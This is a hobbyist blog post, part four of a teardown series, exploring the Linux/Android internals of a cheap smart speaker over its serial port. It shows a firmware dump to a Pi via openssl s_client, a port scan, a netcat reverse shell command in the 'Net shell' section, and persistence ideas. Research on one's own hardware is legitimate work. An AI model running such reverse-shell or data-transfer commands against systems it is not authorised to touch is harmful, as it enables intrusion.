---
layout: post
slug: cheap-smart-speaker-teardown-part4
title:  "Cheap Smart Speaker Teardown part 4"
date:   2023-01-18 18:00:00
categories:
- infosec
tags:
- embedded
- hacking
- reversing
- android
- hardware
- home-automation
---

# Introduction

Last month I picked up a cheap smart speaker from a local electronics retailer and this weekend I was rained in, so took the opportunity to have some fun and practice doing a teardown and firmware dump

This is the fourth part in a multi-part series:
- [Part 1]({{ site.baseurl }}{% link _posts/2022-11-12-cheap-smart-speaker-teardown-part1.markdown %}) - Photo essay of physical teardown
- [Part 2]({{ site.baseurl }}{% link _posts/2022-11-12-cheap-smart-speaker-teardown-part2.markdown %}) - passive reconaissance and integrated circuit identification
- [Part 3]({{ site.baseurl }}{% link _posts/2022-11-12-cheap-smart-speaker-teardown-part3.markdown %}) - find the serial port
- Part 4 - initial exploration
- Part 5 - (coming)

# Recap

To recap, the objective is to complete a physical tear down (done), perform a black box reconaissance (done), dump the firmware and make a preliminary attack surface analysis. With luck, then put it back together retaining access to the running internals.

The main processor I am 95% confident is an ARM 64-bit with 512MB of DDR; there is a bluetooth + wifi SOC with Linux drivers, and a good chance this system runs Linux. There is a DAC, a secondary microcontroller, and a 1GB flash chip. The serial port is accessible and supports transmit and receive.

# Part 4 - Exploration

**Note: I approached this as a black box exercise. People have documented how google cast works, and is typically deployed, and I ued that info later to confirm things, but to start with, I deliberately approached pretending I knew nothing about the target**

Now we have a serial port, it was time for a look around. The first thing is to restart picocom with logging enabled, to make life easier going back for screenshots later. I ran this in screen too, so I could leave it connected indefinitely and switch to it from another machine later.
```
screen picocom --logfile mylog.txt -b 921000
```

The first thing I noticed was the continuous junk about battery levels and the like, so having the log and scrollback was already useful - I could type a command, then scroll back and find the output.

**Note: The rest of this analysis is not necessarily in the order I tried and discovered things!**

## Operating system is Linux, with busybox _and_ toybox

It didnt take long to work out this was some kind of embedded Linux, with a 4.4 series kernel, derived from Android; and definitely an arm 64.

Output from `cat /proc/version`:
```
Linux version 4.4.22 (mediatek@mediatek) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Oct 16 12:17:57 CST 2017
```

Output from `cat /proc/cpuinfo`:
```
processor       : 0
Processor       : AArch64 Processor rev 1 (aarch64)
model name      : AArch64 Processor rev 1 (aarch64)
BogoMIPS        : 26.00
Features        : fp asimd evtstrm aes pmull sha1 sha2 crc32
CPU implementer : 0x41
CPU architecture: 8
CPU variant     : 0x0
CPU part        : 0xd04
CPU revision    : 1

processor       : 1
Processor       : AArch64 Processor rev 1 (aarch64)
model name      : AArch64 Processor rev 1 (aarch64)
BogoMIPS        : 26.00
Features        : fp asimd evtstrm aes pmull sha1 sha2 crc32
CPU implementer : 0x41
CPU architecture: 8
CPU variant     : 0x0
CPU part        : 0xd04
CPU revision    : 1

Hardware        : MT8516
```

***Notably, the hardware here is MT8516, which is not am MT2601, but I'm not sure if that is actually a series of processors or not***

Output from `cat /proc/meminfo`:
```
# cat /proc/meminfo
MemTotal:         479964 kB
MemFree:          333244 kB

<...snipped>
```

***Close enough to 512MB***

Output from `cat /proc/partitions`:
```
# cat /proc/partitions
major minor  #blocks  name

  31        0       1024 mtdblock0
  31        1       1024 mtdblock1
  31        2       1024 mtdblock2
  31        3       1024 mtdblock3
  31        4       3072 mtdblock4
  31        5       2048 mtdblock5
  31        6      12288 mtdblock6
  31        7      12288 mtdblock7
  31        8       1024 mtdblock8
  31        9       1024 mtdblock9
  31       10       2048 mtdblock10
  31       11       2048 mtdblock11
  31       12       2048 mtdblock12
  31       13       2048 mtdblock13
  31       14       2048 mtdblock14
  31       15     163840 mtdblock15
  31       16     112640 mtdblock16
  31       17     191232 mtdblock17
```

***Lots of partitions! Adds up to 512MB which matches out integrated circuit identification***

Output from `/proc/mounts`:
```
rootfs / rootfs rw 0 0
tmpfs /dev tmpfs rw,relatime,size=4096k,mode=755 0 0
devpts /dev/pts devpts rw,relatime,mode=600 0 0
proc /proc proc rw,relatime 0 0
sysfs /sys sysfs rw,relatime 0 0
debugfs /sys/kernel/debug debugfs rw,relatime 0 0
tmpfs /tmp tmpfs rw,relatime,size=32768k 0 0
tmpfs /dev/shm tmpfs rw,relatime,size=65536k 0 0
ubi0:system /system ubifs ro,relatime 0 0
ubi1:chrome /chrome ubifs ro,relatime 0 0
ubi2:userdata /data ubifs rw,sync,relatime 0 0
adb /dev/usb-ffs/adb functionfs rw,relatime 0 0
```

**None of these directly link to /dev/mtd/..., so indicative of ramdisks / squashfs, etc. And of course, ubi is a flash filesystem used with Android, and if that is not enough of a giveaway, the /chrome partition and the adb mount also point to that**


The `ps` command seems to have no options by default (`ps -ef`, `ps aux` both produce no output) but when run with no args actually dumps all the info. Output from `ps`:
```
USER     PID   PPID  VSIZE  RSS     WCHAN    PC         NAME
root      1     0     3308   2408  00000001 f7170d56 S /init
root      2     0     0      0     00000001 00000000 S kthreadd
root      3     2     0      0     00000001 00000000 S ksoftirqd/0
root      4     2     0      0     00000001 00000000 S kworker/0:0
root      5     2     0      0     00000001 00000000 S kworker/0:0H
root      6     2     0      0     00000001 00000000 S kworker/u8:0
root      7     2     0      0     00000001 00000000 S rcu_preempt
root      8     2     0      0     00000001 00000000 S rcu_sched
root      9     2     0      0     00000001 00000000 S rcu_bh

<...snipped for brevity>

root      170   1     3096   1896  00000001 f753f856 S /system/bin/kisd
root      201   1     11200  724   00000001 f7471d72 S /vendor/bin/wmt_launcher
sntpd     203   1     3116   744   00000001 f7045326 S /bin/sntpd

<...snipped for brevity>

root      221   218   12088  1920  00000001 f6f5dd04 S /system/bin/ipcd
root      222   1     55100  684   00000000 f76212c0 S /system/bin/eipcd
root      223   1     83920  2824  00000000 f7413342 S /system/bin/upg_daemon
root      224   1     60688  2880  00000000 f71fe342 S /system/bin/autotools_daemon
system    225   219   2952   776   00000001 f7298116 S /system/bin/sh
system    227   225   274220 5184  00000000 f6d6c342 S /system/bin/appmainprog

<...snipped for brevity>

dhcp      399   1     3080   768   00000001 f732bd56 S /bin/dhcpcd
wifi      400   1     5452   3436  00000001 f71f4ce8 S /bin/wpa_supplicant

<...snipped for brevity>

root      433   430   32692  3096  00000000 f74c2342 S /bin/net_mgr
system    434   429   130364 4800  00000000 f7082cf6 S /system/bin/bluetoothtbd
system    435   428   2980   644   00000001 f750b606 S /system/bin/servicemanager
root      469   1     2952   776   00000001 f7625116 S /bin/sh
root      472   469   3116   752   00000000 f72def06 R ps
```

Output from `busybox`:
```
Currently defined functions:
        [, [[, acpid, add-shell, addgroup, adduser, adjtimex, arp, arping, ash,
        awk, base64, basename, beep, blkid, blockdev, bootchartd, brctl,
        bunzip2, bzcat, bzip2, cal, cat, catv, chat, chattr, chgrp, chmod,
        chown, chpasswd, chpst, chroot, chrt, chvt, cksum, clear, cmp, comm,
        conspy, cp, cpio, crond, crontab, cryptpw, cttyhack, cut, date, dc, dd,
        deallocvt, delgroup, deluser, depmod, devmem, df, dhcprelay, diff,
        dirname, dmesg, dnsd, dnsdomainname, dos2unix, du, dumpkmap,
        dumpleases, echo, ed, egrep, eject, env, envdir, envuidgid, ether-wake,
        expand, expr, fakeidentd, false, fbset, fbsplash, fdflush, fdformat,
        fdisk, fgconsole, fgrep, find, findfs, flock, fold, free, freeramdisk,
        fsck, fsck.minix, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty,
        grep, groups, gunzip, gzip, halt, hd, hdparm, head, hexdump, hostid,
        hostname, httpd, hush, hwclock, id, ifconfig, ifdown, ifenslave,
        ifplugd, ifup, inetd, init, insmod, install, ionice, iostat, ip,
        ipaddr, ipcalc, ipcrm, ipcs, iplink, iproute, iprule, iptunnel,
        kbd_mode, kill, killall, killall5, klogd, last, less, linux32, linux64,
        linuxrc, ln, loadfont, loadkmap, logger, login, logname, logread,
        losetup, lpd, lpq, lpr, ls, lsattr, lsmod, lsof, lspci, lsusb, lzcat,
        lzma, lzop, lzopcat, makedevs, makemime, man, md5sum, mdev, mesg,
        microcom, mkdir, mkdosfs, mke2fs, mkfifo, mkfs.ext2, mkfs.minix,
        mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more,
        mount, mountpoint, mpstat, mt, mv, nameif, nanddump, nandwrite,
        nbd-client, nc, netstat, nice, nmeter, nohup, nslookup, ntpd, od,
        openvt, passwd, patch, pgrep, pidof, ping, ping6, pipe_progress,
        pivot_root, pkill, pmap, popmaildir, poweroff, powertop, printenv,
        printf, ps, pscan, pstree, pwd, pwdx, raidautorun, rdate, rdev,
        readahead, readlink, readprofile, realpath, reboot, reformime,
        remove-shell, renice, reset, resize, rev, rm, rmdir, rmmod, route, rpm,
        rpm2cpio, rtcwake, run-parts, runlevel, runsv, runsvdir, rx, script,
        scriptreplay, sed, sendmail, seq, setarch, setconsole, setfont,
        setkeycodes, setlogcons, setserial, setsid, setuidgid, sh, sha1sum,
        sha256sum, sha3sum, sha512sum, showkey, slattach, sleep, smemcap,
        softlimit, sort, split, start-stop-daemon, stat, strings, stty, su,
        sulogin, sum, sv, svlogd, swapoff, swapon, switch_root, sync, sysctl,
        syslogd, tac, tail, tar, tcpsvd, tee, telnet, telnetd, test, tftp,
        tftpd, time, timeout, top, touch, tr, traceroute, traceroute6, true,
        tty, ttysize, tunctl, udhcpc, udhcpd, udpsvd, umount, uname, unexpand,
        uniq, unix2dos, unlzma, unlzop, unxz, unzip, uptime, users, usleep,
        uudecode, uuencode, vconfig, vi, vlock, volname, wall, watch, watchdog,
        wc, wget, which, who, whoami, whois, xargs, xz, xzcat, yes, zcat, zcip
```

Output from `toybox`:
```
acpi base64 basename blkid blockdev bunzip2 bzcat cal cat chattr chgrp
chmod chown chroot cksum clear cmp comm cp cpio cut date dd df dirname
dmesg dos2unix du echo egrep env expand expr fallocate false fgrep
find free freeramdisk fsfreeze grep groups head help hostname hwclock
id ifconfig inotifyd insmod install ionice iorenice kill killall ln
logname losetup ls lsattr lsmod lsof lsusb makedevs md5sum mkdir mkfifo
mknod mkswap mktemp modinfo more mount mountpoint mv nbd-client netstat
nice nl nohup od partprobe paste patch pgrep pidof pivot_root pkill
pmap printenv printf pwd pwdx readlink realpath renice rev rfkill
rm rmdir rmmod route sed seq setsid sha1sum sleep sort split stat
strings swapoff swapon switch_root sync sysctl tac tail tar taskset
tee time timeout top touch tr traceroute traceroute6 true truncate
tty umount uname uniq unix2dos uptime usleep vconfig vmstat wc which
whoami xargs xxd yes
```

Output from `ip link`:
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: ifb0: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN mode DEFAULT qlen 32
    link/ether fe:47:6e:60:04:c3 brd ff:ff:ff:ff:ff:ff
3: ifb1: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN mode DEFAULT qlen 32
    link/ether 4e:2e:5c:3d:d4:f8 brd ff:ff:ff:ff:ff:ff
4: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN mode DEFAULT qlen 1
    link/ipip 0.0.0.0 brd 0.0.0.0
5: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN mode DEFAULT qlen 1
    link/sit 0.0.0.0 brd 0.0.0.0
6: ip6tnl0@NONE: <NOARP> mtu 1452 qdisc noop state DOWN mode DEFAULT qlen 1
    link/tunnel6 :: brd ::
7: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN mode DORMANT qlen 1000
    link/ether 6c:5a:b5:54:e6:58 brd ff:ff:ff:ff:ff:ff
8: ap0: <BROADCAST,MULTICAST> mtu 1500 qdisc mq state DOWN mode DEFAULT qlen 1000
    link/ether fa:8f:ca:52:17:50 brd ff:ff:ff:ff:ff:ff
```

Output from `cat /proc/cmdline`:
```
console=ttyS0,921600n1 earlycon=uart8250,mmio32,0x11005000 root=/dev/ram vmalloc=496M androidboot.hardware=aud8516p1_linux androidboot.verifiedbootstate=green bootopt=64S3,32N2,64N2 printk.disable_uart=1 bootprof.pl_t=5262 bootprof.lk_t=1060 boot_reason=0 androidboot.serialno=123456789abc androidboot.bootreason=power_key
```

Confirmation of the baud rate, although we already know this because it is what works with picocom...

## Disable the continuous output

There was a background process dumping logs onto the terminal. After trying to kill various processes, in the end I worked out it was a program called FIXME. I later confirmed this by finding a shell script where the output was piped to the serial console. From this point, to get rid of it I could run the following command: FIXME. However, I also discovered at another point that this killed the network... bit of a trade-off until I could work out a way to avoid it.

I could suppress the serial output by killing the following 3 processes, provided I killed process_manager first:
```
killall process_manager
killall appmainprog
killall upg_daemon
```

## Reboot problems

You can turn the device off by holding the power button down for a few seconds. You turn it on by doing the same; it then shows a bit of a colourful display on the four LEDs, and then maybe 15 seconds later plays a tune and announces in a dulcet voice on the speaker that you should pair with the assistant mobile app.

However, I noticed that it would hang, when I rebooted it with the serial Tx line (output from the pi to the target) connected. Indeed, this was only recoverable even by disconnecting the battery! There was a crash in the log. Looks like I've acidentally managed to glitch it in some way without even wanting too... this will prove annoying if I want to reboot it often, beyond what I've needed to do so far.

```
<... buckets of stuff snipped at powerup, likely from the on-chip bootloader and/or uboot>

=========================

memory test start address = 0x40000000, test length = 0x2000
[MEM] complex R/W mem test fail :FFFFFFFF
<ASSERT> memory.c:line 142 0
PL fatal error...
mtk detect key function pmic_detect_homekey MTK_PMIC_RST_KEY = 5
pl pmic FCHRKEY Release
PL delay for Long Press Reboot
pl pmic powerkey Press
power key is pressed
pl pmic powerkey Press
```

The workaround is to simply disconnect Tx from the pi until after the system boots.

Perhaps this is because the Pi tx is 3V; the target is tolerant of this, but not enough during boot. If I can be bothered or need to, I might try a dropping diode or something else in the line.

# Firmware dump approaches

The objective is to dump those 18 firmware partitions.

At worst case, we can use the shell to print them in hex to the console and then cut/paste and parse the log with xxd later.
That would be very tedious and time consuming though!

A preferable way would be to dump it over the network using an existing binary. Methods potentially available to us, depending on what is compiled into busybox and toybox, could include (with spoilers, I havent bothered documenting the detail of the incomplete attempts):
- netcat (busybox nc)  (I had some issues using netcat with dropping connections on transfers, not sure why, I might revisit later but for now I cant be bothered)
- busybox nbd-client (I didn't end up trying this)
- openssl s_client (I used this first, but it started getting tedious looping over 18 firmware partitions and was also prone to dropping)
- xxd to the serial port or shell (as mentioned)
- scp (I discovered this last and it made things a lot easier!)
- a ping -p tunnel (again, tedious, but can be done if needed)
- curl with data upload to a web server on my pi400 (didnt bother trying)
- almost certainly other options

FWIW, when I tried to make a telnetd process, it must have been incompletely compiled as it would just drop connection attempts when I did get the network up.

Using openssl involves creating a self signed certificate on another host (in my case, my Pi400) and then using openssl s_server command to listen, and dump received data to a file. You then run openssl s_client from the target and pipe a file into it. In both ends I needed to use the no hang up option, then monitor the receiver until the file size matched the partition size, then kill both ends. Works, but annoying. See <https://gtfobins.github.io/gtfobins/openssl/>

# First wireless connection

Anyway, I decided to try and connect the network, so I could offload the firmware.

***Important to note, the target has not yet been paired with any assistant mobile app. One assumes this state is known on the target and retained in configuration somewhere; also, it will be in a mode that it is waiting for a pairing before doing anything usefull

First, for kicks, I scanned for bluetooth using `hcitool` on the pi400, unsurprisingly, nothing yet. This is something that could be done later if the target is placed into bluetooth speaker mode, which it apparently supports.

Then I scanned for Wifi Access Points - this tests the hypothesis (there is more than one way to skin this cat) that before pairing, the target uses the method of running an open access point, and the mobile app looks for this, and then sends commands to configure the target into AP station mode.

The output from `iw dev wlan0 scan` on the pi400 includes the following AP:
```
BSS fa:8f:ca:52:33:54(on wlan0) -- associated
	last seen: 79097.967s [boottime]
	TSF: 0 usec (0d, 00:00:00)
	freq: 2437
	beacon interval: 100 TUs
	capability: ESS ShortPreamble ShortSlotTime (0x0421)
	signal: -30.00 dBm
	last seen: 0 ms ago
	SSID: TicHome Mini5552.n017
	Supported rates: 1.0 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
	TIM: DTIM Count 0 DTIM Period 2 Bitmap Control 0x0 Bitmap[0] 0x0
	Extended supported rates: 24.0 36.0 48.0 54.0 
	ERP: <no flags>
	HT capabilities:
		Capabilities: 0x131
			RX LDPC
			HT20
			Static SM Power Save
			RX Greenfield
			RX HT20 SGI
			RX STBC 1-stream
			Max AMSDU length: 3839 bytes
			No DSSS/CCK HT40
		Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
		Minimum RX AMPDU time spacing: No restriction (0x00)
		HT TX/RX MCS rate indexes supported: 0-7
	HT operation:
		 * primary channel: 6
		 * secondary channel offset: no secondary
		 * STA channel width: 20 MHz
		 * RIFS: 0
		 * HT protection: no
		 * non-GF present: 1
		 * OBSS non-GF present: 0
		 * dual beacon: 0
		 * dual CTS protection: 0
		 * STBC beacon: 0
		 * L-SIG TXOP Prot: 0
		 * PCO active: 0
		 * PCO phase: 0
	Extended capabilities:
	WMM:	 * Parameter version 1
		 * u-APSD
		 * BE: CW 15-1023, AIFSN 3
		 * BK: CW 15-1023, AIFSN 7
		 * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
		 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
```

When I ran the scan from a clean reboot, the SSID was different, from if I had killed /chrome/process_manager and appmainprog, and then restarted the process_manager - in the latter, the SSID was `Google Assistant Speaker1234.`, as opposed to `TicHome Mini5552.n017`, probably an artefact of bootup ordering and configuration files and command line arguments being different.

This was using hostapd and dnsmasq.

With Wireshark running, I then connected the pi400 as a client. The target issued the pi400 a DHCP address of 192.168.255.252 and itself has 192.168.255.249 during this pairing process. If this was a phone with the assistant app, it would have then continued with setup.

I could now see the following ports from the inside (output from `netstat -lt`)
```
# netstat -lt
Proto Recv-Q Send-Q Local Address          Foreign Address        State
 tcp       0      0 0.0.0.0:8080           0.0.0.0:*              LISTEN
 tcp       0      0 0.0.0.0:53             0.0.0.0:*              LISTEN
 tcp       0      0 127.0.0.1:58530        0.0.0.0:*              LISTEN
 tcp       0      0 0.0.0.0:8008           0.0.0.0:*              LISTEN
 udp       0      0 0.0.0.0:35669          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:35670          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:32344          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:1900           0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:48795          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:37537          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40100          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40101          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40102          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40103          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40104          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40105          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40106          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40107          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40108          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:40109          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:8888           0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:49117          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:48104          0.0.0.0:*              CLOSE
 udp       0      0 127.0.0.1:52978        127.0.0.1:45607        ESTABLISHED
 udp       0      0 0.0.0.0:50678          0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:54565          0.0.0.0:*              CLOSE
 udp       0      0 127.0.0.1:45607        127.0.0.1:52978        ESTABLISHED
 udp       0      0 0.0.0.0:53             0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:67             0.0.0.0:*              CLOSE
 udp       0      0 0.0.0.0:42056          0.0.0.0:*              CLOSE
tcp6       0      0 :::10001               :::*                   LISTEN
tcp6       0      0 :::9000                :::*                   LISTEN
tcp6       0      0 :::8009                :::*                   LISTEN
udp6       0      0 :::10001               :::*                   CLOSE
```

From the pi400 I used nmap to enumerate open ports, the fast way:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2022-11-13 09:46 ACDT
NSE: Loaded 43 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 09:46
Completed Parallel DNS resolution of 1 host. at 09:46, 13.00s elapsed
Initiating Connect Scan at 09:46
Scanning 192.168.255.249 [1000 ports]
Discovered open port 8080/tcp on 192.168.255.249
Discovered open port 53/tcp on 192.168.255.249
Discovered open port 10001/tcp on 192.168.255.249
Discovered open port 9000/tcp on 192.168.255.249
Discovered open port 8008/tcp on 192.168.255.249
Discovered open port 8009/tcp on 192.168.255.249
Completed Connect Scan at 09:46, 0.23s elapsed (1000 total ports)
Initiating Service scan at 09:46
Scanning 6 services on 192.168.255.249
Completed Service scan at 09:48, 97.68s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.255.249.
Initiating NSE at 09:48
Completed NSE at 09:48, 1.13s elapsed
Initiating NSE at 09:48
Completed NSE at 09:48, 1.02s elapsed
Nmap scan report for 192.168.255.249
Host is up (0.011s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     dnsmasq 2.51
8008/tcp  open  http?
8009/tcp  open  ajp13?
8080/tcp  open  http-proxy Mongoose/6.6
9000/tcp  open  tcpwrapped
10001/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.70%I=7%D=11/13%Time=63702967%P=arm-unknown-linux-gnuea
SF:bihf%r(GetRequest,C1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Mongoose/6\.
SF:6\r\nContent-Type:\x20text/plain\r\nConnection:\x20close\r\nContent-Len
SF:gth:\x2087\r\n\r\n{\n\t\"ManufacturerOUI\":\t\"\",\n\t\"SoftwareVersion
SF:\":\t\"18853012\",\n\t\"DeviceIPAddress\":\t\"Error\"\n}")%r(FourOhFour
SF:Request,79,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:\x20Mongoose/6\.
SF:6\r\nContent-Type:\x20text/plain\r\nConnection:\x20close\r\nContent-Len
SF:gth:\x209\r\n\r\nNot\x20Found");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.32 seconds
```

Mongoose is an embedded web server library, often used in IoT systems.

*** Reminder, the device is in a bootstrap or pairing mode - this could differ in normal use ***

# Firmware dumping and preliminary analysis

I dumped the firmware the hard way using the `openssl s_client` method, before I found `scp` hiding away in `/data/usr/bin/scp`, C'est la vie.

After creating the keys, on the pi400 I ran a script in a loop, that spawned 18 processes at once:
```
for x in $(seq 0 17) ; do openssl s_server -quiet -key key.pem -cert certpem -port $(( 2000 + $x )) > mtd$x &  done
```

On the target, I then ran a loop to upload them all:
```
date -s 20221114:1645
for x in $(seq 0 17) ; do cat mtdblock$x | openssl s_client  -connect 192.168.255.252:$(( 2000 + $x )) -ign_eof & done
```

This failed until I set the date! TLS of course needs accurate time; the system started in 1969 for some reason (not 1970-01-01 as one might expect) and the certificate I made was boviously in its future.

I could resend a single file thus, after rerunning s_server:
```
cat mtdblock18 | openssl s_client  -connect 192.168.255.252:2018
```

Importantly, the 18th partition is writable, so this could be prone to corruption until killing running processes using files on /data

Running file on all 18 yielded the following:
```
mtd0: data
mtd1: data
mtd2: data
mtd3: ISO-8859 text, with very long lines, with no line terminators
mtd4: data
mtd5: data
mtd6: Android bootimg, kernel (0x40080000), ramdisk (0x44000000), page size: 2048, cmdline (bootopt=64S3,32N2,64N2)
mtd7: Android bootimg, kernel (0x40080000), ramdisk (0x44000000), page size: 2048, cmdline (bootopt=64S3,32N2,64N2)
mtd8: data
mtd9: ISO-8859 text, with very long lines, with no line terminators
mtd10: ISO-8859 text, with very long lines, with no line terminators
mtd11: data
mtd12: data
mtd13: ISO-8859 text, with very long lines, with no line terminators
mtd14: ISO-8859 text, with very long lines, with no line terminators
mtd15: UBI image, version 1
mtd16: UBI image, version 1
mtd17: UBI image, version 1
```

Further evidence this is using Android (even without a screen of course)

At this point I went back and looked at the serial log, at messages from the bootloaded before Linux. In particular is a mapping of partitions and names and sizes:
```
[PART] [0x0000000000000000-0x00000000000FFFFF] "PRELOADER" (512 blocks) 
[PART] [0x0000000000100000-0x00000000001FFFFF] "PRO_INFO" (512 blocks) 
[PART] [0x0000000000200000-0x00000000002FFFFF] "NVRAM" (512 blocks) 
[PART] [0x0000000000300000-0x00000000003FFFFF] "PROTECT_F" (512 blocks) 
[PART] [0x0000000000400000-0x00000000006FFFFF] "SECCFG" (1536 blocks) 
[PART] [0x0000000000700000-0x00000000008FFFFF] "UBOOT" (1024 blocks) 
[PART] [0x0000000000900000-0x00000000014FFFFF] "BOOTIMG" (6144 blocks) 
[PART] [0x0000000001500000-0x00000000020FFFFF] "RECOVERY" (6144 blocks) 
[PART] [0x0000000002100000-0x00000000021FFFFF] "SEC_RO" (512 blocks) 
[PART] [0x0000000002200000-0x00000000022FFFFF] "MISC" (512 blocks) 
[PART] [0x0000000002300000-0x00000000024FFFFF] "EXPDB" (1024 blocks) 
[PART] [0x0000000002500000-0x00000000026FFFFF] "TEE1" (1024 blocks) 
[PART] [0x0000000002700000-0x00000000028FFFFF] "TEE2" (1024 blocks) 
[PART] [0x0000000002900000-0x0000000002AFFFFF] "KB" (1024 blocks) 
[PART] [0x0000000002B00000-0x0000000002CFFFFF] "DKB" (1024 blocks) 
[PART] [0x0000000002D00000-0x000000000CCFFFFF] "CHROME" (81920 blocks) 
[PART] [0x000000000CD00000-0x0000000013AFFFFF] "ANDROID" (56320 blocks) 
[PART] [0x0000000013B00000-0x000000001F5BFFFF] "USRDATA" (95616 blocks) 
```

Marrying this information together can give us further ideas if needed later if we decide to try and replace the firmware...

# Poking around the filesystem

Notable non-proprietary binaries likely to be useful for various exercises:
- /bin/busybox
- toybox (alternative to busybox)
- /bin/alsactl - and related tools, indicates we can use standard linux commands to play or record sound
- /bin/wpa_supplicant - presumably used after pairing to become a station
- /bin/tcpdump
- /bin/openssl
- /bin/iw - and related tools
- /bin/iptables
- /bin/bonnie++ - this is a hard drive performance tester, not sure why it is here...
- /bin/bash - good, not just a partially functional shell
- /bin/curl
- /bin/dhcpcd
- /bin/dnsmasq
- /bin/collectd and related tools (interesting... the box can gather stats on itself)
- /bin/hostapd
- /bin/iperf

There are others, too

Later, we could survey the versions of these and look for CVEs potentially exploitable to allow use to get access without serial

There is no hci_tool as found in many Linux.

Other embedded binaries that might be worth investigating, just based on the name:
- /bin/flash_bootloader
- /bin/flash_image
- /bin/factory
- /bin/eeprom_nv
- /bin/eipc
- /bin/boots_srv
- /bin/bluetoothtbd
- /bin/ble_util
- /bin/appmainprog - spoiler, this runs one of the listening sockets
- /bin/autotools_daemon - spoiler, this runs one of the listening sockets
- /bin/BT_RX_Start and others
- /bin/WIFI_ATEmode - I think ATE mode is the pairing mode
- /bin/WIFI_RX_Start and others
- /bin/cast_control_server and related tools
- /bin/kisd - I think this is a secure enclave tool or similar, from quick Internet search

There are others, too

The /sbin/ directory has a bunch of shell scripts, and the ubi related tools

There are some random things in /vendor/bin

In /xbin/ were strace and another tcpdump

In /usr/bin is gdbserver! and a bunch of other scripts

In /data/usr/bin is dropbear with a symlink for scp

There are more binaries in /chrome. A quick search indicates that smart speakers and casters may actually use a headless browser to fetch and process media files.

# Net shell

I was able to make a netcat reverse shell.

On the pi400, listen on port 6789:
```
nc –lvp 6789
```

On the target - connect to the pi on port 6789 and then start the shell and pipe the I/O through:
```
busybox nc 192.168.255.252 6789 -e /bin/sh
```

Doing it this way is annoying, if you press CTRL+C on the pi it kills the connection... there are better ways.

At least with the shell, I dont have to deal with the logging junk.

# Persistence

At the moment, this is a bit annoying
- to reboot, need to ensure tx is temporarily disconnected
- seems to be no way to hook system boot process and get a program to run from `/data` so we can launch a remote shell

Ultimately there are a few ways to do this, but they may all take (a lot) of time:
- find a vulnerability locally that lets us trick the system into running a script from /data, the only writable partition
- find a vulnerability explotable over the network that we can run a payload
- find a way to alter the flash image and update the firmware - this may or may not include having to deal with signatures and hashes in the bootloader
- find a way to alter Uboot environment to have the system auto try and boot using TFTP over wifi or even PPP over serial, this will need the serial wires to remain exposed
- connect an implant that reads the serial and at the right time, starts the shell...

We can certainly find a way to cross compile arm64 binaries and leave them in /data if needed.

# Potential projects

With time, it should be feasible to:

- maybe, replace the firmware with a stock Linux derivative using bit of Android
- maybe, patch the existing firmware in a way to make it more generally usable

This would be a long term project, I don't really have time to think too much about it now.

In the short term, it would be nice to find a way to persist, and even maybe find a novel vuln.

More to come in Part 5.
